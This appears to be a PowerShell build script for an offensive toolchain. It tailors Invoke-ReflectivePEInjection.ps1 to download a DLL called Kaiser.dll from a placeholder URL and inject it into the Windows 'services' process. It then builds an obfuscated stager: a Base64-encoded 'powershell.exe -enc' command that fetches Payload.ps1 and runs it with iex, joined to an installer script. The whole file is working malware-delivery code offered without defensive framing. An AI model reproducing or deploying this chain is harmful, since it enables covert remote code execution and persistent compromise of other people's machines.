# Tailor Invoke-ReflectivePEInjection.ps1
# Read Invoke-ReflectivePEInjection.ps1
$payload = [IO.File]::ReadAllText(".\Invoke-ReflectivePEInjection.ps1")

# Append payload into file
# Download the DLL
$kaiser_location = "<URL to Kaiser.dll>"
$payload += ";`n" + '$PEBytes = (New-Object Net.WebClient).DownloadData("' + $kaiser_location + '");'

# Write the command for Invoke-ReflectivePEInjection.ps1
# We want to inject into services process
$payload += "`n" + 'Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName services'
$payload | Out-File -Encoding ASCII -FilePath ".\Payload.ps1" -Force

# This is the downloader code.
# Download Payload.ps1
$payload_location = "<URL to Payload.ps1>"
$downloader = 'iex $(New-Object Net.WebClient).DownloadString("' + $payload_location + '")'

# Write it out to the initial stager.
$downloader = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($downloader))
$installer = '$cmd = ''' + $pshome + '\powershell.exe -enc ' + $downloader + "'`n`n"
$installer += [IO.File]::ReadAllText(".\InstallKaiser.ps1")
$installer | Out-File -Encoding ASCII -FilePath ".\Installer.ps1" -Force 
